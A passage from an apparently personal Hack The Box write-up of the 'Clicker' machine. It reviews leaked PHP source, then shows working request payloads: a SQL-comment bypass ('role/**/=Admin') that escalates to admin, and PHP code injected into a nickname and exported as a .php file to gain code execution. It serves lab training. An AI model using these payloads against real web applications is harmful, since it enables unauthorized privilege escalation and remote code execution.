+<span class="mi">2019</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">13</span> <span class="mi">11</span><span class="p">:</span><span class="mi">47</span><span class="p">:</span><span class="mi">50</span> <span class="o">.....</span>       <span class="mi">190253</span>        <span class="mi">46005</span>  <span class="n">clicker</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">assets</span><span class="o">/</span><span class="n">js</span><span class="o">/</span><span class="n">bootstrap</span><span class="o">.</span><span class="n">min</span><span class="o">.</span><span class="n">js</span><span class="o">.</span><span class="n">map</span>
+<span class="mi">2019</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">13</span> <span class="mi">11</span><span class="p">:</span><span class="mi">47</span><span class="p">:</span><span class="mi">50</span> <span class="o">.....</span>        <span class="mi">78635</span>        <span class="mi">22247</span>  <span class="n">clicker</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">assets</span><span class="o">/</span><span class="n">js</span><span class="o">/</span><span class="n">bootstrap</span><span class="o">.</span><span class="n">bundle</span><span class="o">.</span><span class="n">min</span><span class="o">.</span><span class="n">js</span>
+<span class="mi">2019</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">13</span> <span class="mi">11</span><span class="p">:</span><span class="mi">47</span><span class="p">:</span><span class="mi">50</span> <span class="o">.....</span>        <span class="mi">58072</span>        <span class="mi">15377</span>  <span class="n">clicker</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">assets</span><span class="o">/</span><span class="n">js</span><span class="o">/</span><span class="n">bootstrap</span><span class="o">.</span><span class="n">min</span><span class="o">.</span><span class="n">js</span>
+<span class="mi">2019</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">13</span> <span class="mi">11</span><span class="p">:</span><span class="mi">47</span><span class="p">:</span><span class="mi">50</span> <span class="o">.....</span>       <span class="mi">222911</span>        <span class="mi">47855</span>  <span class="n">clicker</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">assets</span><span class="o">/</span><span class="n">js</span><span class="o">/</span><span class="n">bootstrap</span><span class="o">.</span><span class="n">bundle</span><span class="o">.</span><span class="n">js</span>
+<span class="mi">2019</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">13</span> <span class="mi">11</span><span class="p">:</span><span class="mi">47</span><span class="p">:</span><span class="mi">50</span> <span class="o">.....</span>       <span class="mi">402249</span>        <span class="mi">91514</span>  <span class="n">clicker</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">assets</span><span class="o">/</span><span class="n">js</span><span class="o">/</span><span class="n">bootstrap</span><span class="o">.</span><span class="n">bundle</span><span class="o">.</span><span class="n">js</span><span class="o">.</span><span class="n">map</span>
+<span class="mi">2019</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">13</span> <span class="mi">11</span><span class="p">:</span><span class="mi">47</span><span class="p">:</span><span class="mi">50</span> <span class="o">.....</span>       <span class="mi">131637</span>        <span class="mi">24986</span>  <span class="n">clicker</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">assets</span><span class="o">/</span><span class="n">js</span><span class="o">/</span><span class="n">bootstrap</span><span class="o">.</span><span class="n">js</span>
+<span class="mi">2019</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">13</span> <span class="mi">11</span><span class="p">:</span><span class="mi">47</span><span class="p">:</span><span class="mi">50</span> <span class="n">D</span><span class="o">....</span>            <span class="mi">0</span>            <span class="mi">0</span>  <span class="n">clicker</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">assets</span><span class="o">/</span><span class="n">css</span>
+<span class="mi">2019</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">13</span> <span class="mi">11</span><span class="p">:</span><span class="mi">47</span><span class="p">:</span><span class="mi">50</span> <span class="o">.....</span>         <span class="mi">4021</span>         <span class="mi">1593</span>  <span class="n">clicker</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">assets</span><span class="o">/</span><span class="n">css</span><span class="o">/</span><span class="n">bootstrap</span><span class="o">-</span><span class="n">reboot</span><span class="o">.</span><span class="n">min</span><span class="o">.</span><span class="n">css</span>
+<span class="mi">2019</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">13</span> <span class="mi">11</span><span class="p">:</span><span class="mi">47</span><span class="p">:</span><span class="mi">50</span> <span class="o">.....</span>         <span class="mi">4897</span>         <span class="mi">1700</span>  <span class="n">clicker</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">assets</span><span class="o">/</span><span class="n">css</span><span class="o">/</span><span class="n">bootstrap</span><span class="o">-</span><span class="n">reboot</span><span class="o">.</span><span class="n">css</span>
+<span class="mi">2019</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">13</span> <span class="mi">11</span><span class="p">:</span><span class="mi">47</span><span class="p">:</span><span class="mi">50</span> <span class="o">.....</span>        <span class="mi">32461</span>         <span class="mi">8024</span>  <span class="n">clicker</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">assets</span><span class="o">/</span><span class="n">css</span><span class="o">/</span><span class="n">bootstrap</span><span class="o">-</span><span class="n">reboot</span><span class="o">.</span><span class="n">min</span><span class="o">.</span><span class="n">css</span><span class="o">.</span><span class="n">map</span>
+<span class="mi">2019</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">13</span> <span class="mi">11</span><span class="p">:</span><span class="mi">47</span><span class="p">:</span><span class="mi">50</span> <span class="o">.....</span>       <span class="mi">625953</span>       <span class="mi">101514</span>  <span class="n">clicker</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">assets</span><span class="o">/</span><span class="n">css</span><span class="o">/</span><span class="n">bootstrap</span><span class="o">.</span><span class="n">min</span><span class="o">.</span><span class="n">css</span><span class="o">.</span><span class="n">map</span>
+<span class="mi">2019</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">13</span> <span class="mi">11</span><span class="p">:</span><span class="mi">47</span><span class="p">:</span><span class="mi">50</span> <span class="o">.....</span>       <span class="mi">492048</span>        <span class="mi">97754</span>  <span class="n">clicker</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">assets</span><span class="o">/</span><span class="n">css</span><span class="o">/</span><span class="n">bootstrap</span><span class="o">.</span><span class="n">css</span><span class="o">.</span><span class="n">map</span>
+<span class="mi">2019</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">13</span> <span class="mi">11</span><span class="p">:</span><span class="mi">47</span><span class="p">:</span><span class="mi">50</span> <span class="o">.....</span>        <span class="mi">64548</span>         <span class="mi">6881</span>  <span class="n">clicker</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">assets</span><span class="o">/</span><span class="n">css</span><span class="o">/</span><span class="n">bootstrap</span><span class="o">-</span><span class="n">grid</span><span class="o">.</span><span class="n">css</span>
+<span class="mi">2019</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">13</span> <span class="mi">11</span><span class="p">:</span><span class="mi">47</span><span class="p">:</span><span class="mi">50</span> <span class="o">.....</span>       <span class="mi">108539</span>        <span class="mi">13917</span>  <span class="n">clicker</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">assets</span><span class="o">/</span><span class="n">css</span><span class="o">/</span><span class="n">bootstrap</span><span class="o">-</span><span class="n">grid</span><span class="o">.</span><span class="n">min</span><span class="o">.</span><span class="n">css</span><span class="o">.</span><span class="n">map</span>
+<span class="mi">2019</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">13</span> <span class="mi">11</span><span class="p">:</span><span class="mi">47</span><span class="p">:</span><span class="mi">50</span> <span class="o">.....</span>        <span class="mi">48488</span>         <span class="mi">6007</span>  <span class="n">clicker</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">assets</span><span class="o">/</span><span class="n">css</span><span class="o">/</span><span class="n">bootstrap</span><span class="o">-</span><span class="n">grid</span><span class="o">.</span><span class="n">min</span><span class="o">.</span><span class="n">css</span>
+<span class="mi">2019</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">13</span> <span class="mi">11</span><span class="p">:</span><span class="mi">47</span><span class="p">:</span><span class="mi">50</span> <span class="o">.....</span>       <span class="mi">155758</span>        <span class="mi">23142</span>  <span class="n">clicker</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">assets</span><span class="o">/</span><span class="n">css</span><span class="o">/</span><span class="n">bootstrap</span><span class="o">.</span><span class="n">min</span><span class="o">.</span><span class="n">css</span>
+<span class="mi">2019</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">13</span> <span class="mi">11</span><span class="p">:</span><span class="mi">47</span><span class="p">:</span><span class="mi">50</span> <span class="o">.....</span>       <span class="mi">151749</span>        <span class="mi">26663</span>  <span class="n">clicker</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">assets</span><span class="o">/</span><span class="n">css</span><span class="o">/</span><span class="n">bootstrap</span><span class="o">-</span><span class="n">grid</span><span class="o">.</span><span class="n">css</span><span class="o">.</span><span class="n">map</span>
+<span class="mi">2019</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">13</span> <span class="mi">11</span><span class="p">:</span><span class="mi">47</span><span class="p">:</span><span class="mi">50</span> <span class="o">.....</span>       <span class="mi">192348</span>        <span class="mi">25422</span>  <span class="n">clicker</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">assets</span><span class="o">/</span><span class="n">css</span><span class="o">/</span><span class="n">bootstrap</span><span class="o">.</span><span class="n">css</span>
+<span class="mi">2019</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">13</span> <span class="mi">11</span><span class="p">:</span><span class="mi">47</span><span class="p">:</span><span class="mi">50</span> <span class="o">.....</span>        <span class="mi">76483</span>        <span class="mi">16865</span>  <span class="n">clicker</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">assets</span><span class="o">/</span><span class="n">css</span><span class="o">/</span><span class="n">bootstrap</span><span class="o">-</span><span class="n">reboot</span><span class="o">.</span><span class="n">css</span><span class="o">.</span><span class="n">map</span>
+<span class="mi">2023</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">01</span> <span class="mi">17</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="mi">04</span> <span class="o">.....</span>         <span class="mi">3301</span>         <span class="mi">1345</span>  <span class="n">clicker</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">login</span><span class="o">.</span><span class="n">php</span>
+<span class="mi">2023</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">01</span> <span class="mi">17</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="mi">05</span> <span class="o">.....</span>         <span class="mi">3934</span>         <span class="mi">1500</span>  <span class="n">clicker</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">admin</span><span class="o">.</span><span class="n">php</span>
+<span class="mi">2023</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">01</span> <span class="mi">17</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="mi">05</span> <span class="o">.....</span>         <span class="mi">3423</span>         <span class="mi">1348</span>  <span class="n">clicker</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">info</span><span class="o">.</span><span class="n">php</span>
+<span class="mi">2023</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">01</span> <span class="mi">17</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="mi">05</span> <span class="o">.....</span>         <span class="mi">1376</span>          <span class="mi">675</span>  <span class="n">clicker</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">diagnostic</span><span class="o">.</span><span class="n">php</span>
+<span class="mi">2023</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">01</span> <span class="mi">17</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="mi">05</span> <span class="o">.....</span>          <span class="mi">563</span>          <span class="mi">349</span>  <span class="n">clicker</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">save_game</span><span class="o">.</span><span class="n">php</span>
+<span class="mi">2023</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">01</span> <span class="mi">17</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="mi">06</span> <span class="o">.....</span>         <span class="mi">3333</span>         <span class="mi">1353</span>  <span class="n">clicker</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">register</span><span class="o">.</span><span class="n">php</span>
+<span class="mi">2023</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">01</span> <span class="mi">17</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="mi">06</span> <span class="o">.....</span>         <span class="mi">3887</span>         <span class="mi">1409</span>  <span class="n">clicker</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">php</span>
+<span class="mi">2023</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">01</span> <span class="mi">17</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="mi">06</span> <span class="o">.....</span>         <span class="mi">2536</span>          <span class="mi">823</span>  <span class="n">clicker</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">db_utils</span><span class="o">.</span><span class="n">php</span>
+<span class="mi">2023</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">01</span> <span class="mi">17</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="mi">06</span> <span class="n">D</span><span class="o">....</span>            <span class="mi">0</span>            <span class="mi">0</span>  <span class="n">clicker</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">exports</span>
+<span class="mi">2023</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">01</span> <span class="mi">17</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="mi">07</span> <span class="o">.....</span>         <span class="mi">1977</span>          <span class="mi">694</span>  <span class="n">clicker</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">export</span><span class="o">.</span><span class="n">php</span>
+<span class="o">-------------------</span> <span class="o">-----</span> <span class="o">------------</span> <span class="o">------------</span>  <span class="o">------------------------</span>
+<span class="mi">2023</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">01</span> <span class="mi">17</span><span class="p">:</span><span class="mi">21</span><span class="p">:</span><span class="mi">41</span>            <span class="mi">5195487</span>      <span class="mi">2275973</span>  <span class="mi">37</span> <span class="n">files</span><span class="p">,</span> <span class="mi">5</span> <span class="n">folders</span>
+</pre></div>
+
+The file names suggest that it is the source code of the page.<br/><br/>
+We can extract the ZIP content using <code>7z</code>:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali$</span> <span class="mi">7</span><span class="n">z</span> <span class="n">x</span> <span class="n">clicker</span><span class="o">.</span><span class="n">htb_backup</span><span class="o">.</span><span class="n">zip</span>
+
+<span class="mi">7</span><span class="o">-</span><span class="n">Zip</span> <span class="p">[</span><span class="mi">64</span><span class="p">]</span> <span class="mf">16.02</span> <span class="p">:</span> <span class="n">Copyright</span> <span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="mi">1999</span><span class="o">-</span><span class="mi">2016</span> <span class="n">Igor</span> <span class="n">Pavlov</span> <span class="p">:</span> <span class="mi">2016</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">21</span>
+<span class="n">p7zip</span> <span class="n">Version</span> <span class="mf">16.02</span> <span class="p">(</span><span class="n">locale</span><span class="o">=</span><span class="n">C</span><span class="o">.</span><span class="n">UTF</span><span class="o">-</span><span class="mi">8</span><span class="p">,</span><span class="n">Utf16</span><span class="o">=</span><span class="n">on</span><span class="p">,</span><span class="n">HugeFiles</span><span class="o">=</span><span class="n">on</span><span class="p">,</span><span class="mi">64</span> <span class="n">bits</span><span class="p">,</span><span class="mi">4</span> <span class="n">CPUs</span> <span class="n">AMD</span> <span class="n">A8</span><span class="o">-</span><span class="mi">7600</span> <span class="n">Radeon</span> <span class="n">R7</span><span class="p">,</span> <span class="mi">10</span> <span class="n">Compute</span> <span class="n">Cores</span> <span class="mi">4</span><span class="n">C</span><span class="o">+</span><span class="mi">6</span><span class="n">G</span>   <span class="p">(</span><span class="mi">630</span><span class="n">F01</span><span class="p">),</span><span class="n">ASM</span><span class="p">,</span><span class="n">AES</span><span class="o">-</span><span class="n">NI</span><span class="p">)</span>
+
+<span class="n">Scanning</span> <span class="n">the</span> <span class="n">drive</span> <span class="k">for</span> <span class="n">archives</span><span class="p">:</span>
+<span class="mi">1</span> <span class="n">file</span><span class="p">,</span> <span class="mi">2284115</span> <span class="nb">bytes</span> <span class="p">(</span><span class="mi">2231</span> <span class="n">KiB</span><span class="p">)</span>
+
+<span class="n">Extracting</span> <span class="n">archive</span><span class="p">:</span> <span class="n">clicker</span><span class="o">.</span><span class="n">htb_backup</span><span class="o">.</span><span class="n">zip</span>
+<span class="o">--</span>
+<span class="n">Path</span> <span class="o">=</span> <span class="n">clicker</span><span class="o">.</span><span class="n">htb_backup</span><span class="o">.</span><span class="n">zip</span>
+<span class="n">Type</span> <span class="o">=</span> <span class="nb">zip</span>
+<span class="n">Physical</span> <span class="n">Size</span> <span class="o">=</span> <span class="mi">2284115</span>
+
+<span class="n">Everything</span> <span class="ow">is</span> <span class="n">Ok</span>
+
+<span class="n">Folders</span><span class="p">:</span> <span class="mi">5</span>
+<span class="n">Files</span><span class="p">:</span> <span class="mi">37</span>
+<span class="n">Size</span><span class="p">:</span>       <span class="mi">5195487</span>
+<span class="n">Compressed</span><span class="p">:</span> <span class="mi">2284115</span>
+</pre></div>
+
+Upon accessing the source code, I noticed that <code>roles</code> are being used. This means that there are <code>Administrator</code> privileges in the page. For example, when looking at the <code>admin.php</code> file source code, we encounter the following lines:<br/><br/>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="nb">session_start</span><span class="p">();</span>
+<span class="k">include_once</span><span class="p">(</span><span class="s2">"db_utils.php"</span><span class="p">);</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"ROLE"</span><span class="p">]</span> <span class="o">!=</span> <span class="s2">"Admin"</span><span class="p">)</span> <span class="p">{</span>
+  <span class="nb">header</span><span class="p">(</span><span class="s1">'Location: /index.php'</span><span class="p">);</span>
+  <span class="k">die</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="o">......</span>
+<span class="o">......</span>
+<span class="o">......</span>
+<span class="cp">?&gt;</span>
+</pre></div>
+
+The code checks if the value of the session variable <code>ROLE</code> is not equal to "Admin". If the condition is true, it redirects the user to <code>/index.php</code>.<br/><br/>
+Examining the <code>create_new_player</code> function in the <code>db_utils.php</code> file, we observed that when a user is registered, the <code>ROLE</code> column is set to <code>User</code>.<br/><br/>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="k">function</span> <span class="nf">create_new_player</span><span class="p">(</span><span class="nv">$player</span><span class="p">,</span> <span class="nv">$password</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">global</span> <span class="nv">$pdo</span><span class="p">;</span>
+    <span class="nv">$params</span> <span class="o">=</span> <span class="p">[</span><span class="s2">"player"</span><span class="o">=&gt;</span><span class="nv">$player</span><span class="p">,</span> <span class="s2">"password"</span><span class="o">=&gt;</span><span class="nb">hash</span><span class="p">(</span><span class="s2">"sha256"</span><span class="p">,</span> <span class="nv">$password</span><span class="p">)];</span>
+    <span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">"INSERT INTO players(username, nickname, password, role, clicks, level) VALUES (:player,:player,:password,'User',0,0)"</span><span class="p">);</span>
+    <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">(</span><span class="nv">$params</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</pre></div>
+
+In this file, there is also database credentials:<br/><br/>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="nv">$db_server</span><span class="o">=</span><span class="s2">"localhost"</span><span class="p">;</span>
+<span class="nv">$db_username</span><span class="o">=</span><span class="s2">"clicker_db_user"</span><span class="p">;</span>
+<span class="nv">$db_password</span><span class="o">=</span><span class="s2">"clicker_db_password"</span><span class="p">;</span>
+<span class="nv">$db_name</span><span class="o">=</span><span class="s2">"clicker"</span><span class="p">;</span>
+<span class="cp">?&gt;</span>
+</pre></div>
+
+Looking at the <code>save_game.php</code> file, we can see how we were able to change the clicks and level values:<br/><br/>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="nb">session_start</span><span class="p">();</span>
+<span class="k">include_once</span><span class="p">(</span><span class="s2">"db_utils.php"</span><span class="p">);</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'PLAYER'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'PLAYER'</span><span class="p">]</span> <span class="o">!=</span> <span class="s2">""</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$args</span> <span class="o">=</span> <span class="p">[];</span>
+    <span class="k">foreach</span><span class="p">(</span><span class="nv">$_GET</span> <span class="k">as</span> <span class="nv">$key</span><span class="o">=&gt;</span><span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nb">strtolower</span><span class="p">(</span><span class="nv">$key</span><span class="p">)</span> <span class="o">===</span> <span class="s1">'role'</span><span class="p">)</span> <span class="p">{</span>
+            <span class="c1">// prevent malicious users to modify role</span>
+            <span class="nb">header</span><span class="p">(</span><span class="s1">'Location: /index.php?err=Malicious activity detected!'</span><span class="p">);</span>
+            <span class="k">die</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="nv">$args</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$value</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="nx">save_profile</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'PLAYER'</span><span class="p">],</span> <span class="nv">$_GET</span><span class="p">);</span>
+    <span class="c1">// update session info</span>
+    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'CLICKS'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'clicks'</span><span class="p">];</span>
+    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'LEVEL'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'level'</span><span class="p">];</span>
+    <span class="nb">header</span><span class="p">(</span><span class="s1">'Location: /index.php?msg=Game has been saved!'</span><span class="p">);</span>
+
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</pre></div>
+
+Firstly, it checks if we are logged in. Subsequently, it utilizes a <code>foreach</code> loop to iterate through each parameter passed via the GET method. It verifies if the parameter passed through the GET method is equal to <code>role</code>, thereby preventing potential exploitation of the database interaction to modify our role.<br/><br/>
+In the event that the GET parameters are not equal to <code>role</code>, the <code>save_profile</code> function is called, passing the player name along with the GET parameters and their values as arguments.<br/><br/>
+The <code>save_profile</code> function is defined in the <code>db_utils.php</code> file and is comprised of the following instructions:<br/><br/>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="k">function</span> <span class="nf">save_profile</span><span class="p">(</span><span class="nv">$player</span><span class="p">,</span> <span class="nv">$args</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">global</span> <span class="nv">$pdo</span><span class="p">;</span>
+    <span class="nv">$params</span> <span class="o">=</span> <span class="p">[</span><span class="s2">"player"</span><span class="o">=&gt;</span><span class="nv">$player</span><span class="p">];</span>
+    <span class="nv">$setStr</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>
+    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$args</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$setStr</span> <span class="o">.=</span> <span class="nv">$key</span> <span class="o">.</span> <span class="s2">"="</span> <span class="o">.</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">quote</span><span class="p">(</span><span class="nv">$value</span><span class="p">)</span> <span class="o">.</span> <span class="s2">","</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="nv">$setStr</span> <span class="o">=</span> <span class="nb">rtrim</span><span class="p">(</span><span class="nv">$setStr</span><span class="p">,</span> <span class="s2">","</span><span class="p">);</span>
+    <span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">"UPDATE players SET </span><span class="si">$setStr</span><span class="s2"> WHERE username = :player"</span><span class="p">);</span>
+    <span class="nv">$stmt</span> <span class="o">-&gt;</span> <span class="na">execute</span><span class="p">(</span><span class="nv">$params</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</pre></div>
+
+Essentially, this function takes the player name and the GET parameters as arguments. The GET parameters and their corresponding values are then used in an SQL query.<br/><br/>
+<h3><br>Mass Assignment Attack - Abusing SQL Comments</br></h3><br>
+Since the <code>save_game.php</code> is preventing us from specifying the word <code>role</code> as a GET parameter, we cannot modify our role to <code>Admin</code>. However, we can use SQL comments to bypass the validation. Since parameters are passed to an SQL query, the comments won't be interpreted in the query, enabling us to modify the <code>role</code> value.<br/><br/>
+Let me clarify this. In SQL, the following expressions are equivalent:<br/><br/>
+<div class="highlight"><pre><span></span>role=Admin
+</pre></div>
+
+and<br/><br/>
+<div class="highlight"><pre><span></span>role/**/=Admin
+</pre></div>
+
+For PHP (within a string), these values are distinct. This distinction enables us to bypass the check and pass our parameters as arguments to the <code>save_profile</code> function.<br/><br/>
+Let's test this. I will make the following request:<br/><br/>
+<div class="highlight"><pre><span></span>GET /save_game.php?clicks=999999&amp;level=999999&amp;role/**/=Admin
+</pre></div>
+
+I URL-encoded the <code>/**/</code> characters to avoid errors:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/15.png"/><br/><br/>
+I got the following response:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/16.png"/><br/><br/>
+It appears to have worked. Initially, when loading the <code>/index.php</code> page, there were no immediate changes. However, after logging out and signing in again, the modifications became apparent.<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/17.png"/><br/><br/>
+It worked properly, we successfully modified the <code>ROLE</code> attribute of our account.<br/><br/>
+<h3><br>Shell as www-data</br></h3><br>
+As admins, now we can access the <code>/admin.php</code> section:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/18.png"/><br/><br/>
+Here, you can observe the top players on the page. Additionally, there is an "Export" button. <br/><br/>
+When clicking on it, the following request is made:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/19.png"/><br/><br/>
+And we see the following message in the response:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/20.png"/><br/><br/>
+When accessing to <code>exports/top_players_1smeg5dz.txt</code>, the following information is displayed:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/21.png"/><br/><br/>
+Upon examining the request, I found interesting the <code>extension</code> parameter:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/23.png"/><br/><br/>
+Let's see what happens if I change it to <code>elswix</code>:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/24.png"/><br/><br/>
+We got a similiar response. This time the message returned gives us the path to a new file: <code>exports/top_players_8je0i15v.elswix</code><br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/25.png"/><br/><br/>
+The "extension" parameter specifies the extension of the exported file. Upon inspecting the file content, we observed that it corresponds to the data from the database.  If we can manipulate the database (by exploiting the <code>save_profile</code> function) and control the extension of the exported file, we might be able to write a PHP file with malicious content.<br/><br/>
+The values recorded in the exported file include the nickname, clicks, and level. I plan to modify the <code>nickname</code> column, as the other columns appear to store integer values.<br/><br/>
+This will be the request to the <code>save_profile.php</code> file:<br/><br/>
+<div class="highlight"><pre><span></span>GET /save_game.php?clicks=999999&amp;level=999999&amp;nickname=&lt;?php phpinfo(); ?&gt;
+</pre></div>
+
+This will change my nickname to <code>&lt;?php phpinfo(); ?&gt;</code>. <br/><br/>
+I URL-Encoded the payload to avoid errors:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/28.png"/><br/><br/>
+Before utilizing the export function, I will log in again.<br/><br/>
+Now I will use the export function passing <code>php</code> as the extension value:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/29.png"/><br/><br/>
+The response provides us a route to the exported file with the PHP extension:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/30.png"/><br/><br/>
+When loading the PHP file, our new nickname was interpreted:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/clicker/img/31.png"/><br/><br/>
+There are not disabled functions:<br/><br/>
